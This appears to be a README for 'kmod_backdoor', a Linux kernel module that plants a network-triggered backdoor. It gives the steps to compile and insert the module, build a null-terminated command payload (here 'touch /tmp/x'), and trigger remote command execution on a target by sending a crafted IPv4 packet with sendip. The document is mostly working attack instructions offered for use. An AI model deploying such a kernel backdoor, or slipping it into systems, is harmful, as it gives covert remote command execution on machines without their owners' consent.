kmod_backdoor
=============

An up to date module for the backdoor described in the ksplice blog. https://blogs.oracle.com/ksplice/entry/hosting_backdoors_in_hardware
This code includes some fixes to allow us to defer calls to call_usermodhelper.

Steps
------------------

* Compile the code by running make
```sh
$ make
make -C /lib/modules/3.2.0-4-amd64/build SUBDIRS=/home/lmwangi/backdoor modules
make[1]: Entering directory `/usr/src/linux-headers-3.2.0-4-amd64'
  Building modules, stage 2.
  MODPOST 3 modules
make[1]: Leaving directory `/usr/src/linux-headers-3.2.0-4-amd64'

```

* Insmod the relevant module.

* Create a payload that sendip will use. The cmd string must be null terminated.
```sh

$ hexdump -C payload
00000000  74 6f 75 63 68 20 2f 74  6d 70 2f 78 00           |touch /tmp/x.|
0000000d
```
* Exploit
```sh
$ sudo sendip -p ipv4 -is 0 -ip 163 -f payload 192.168.127.108
```
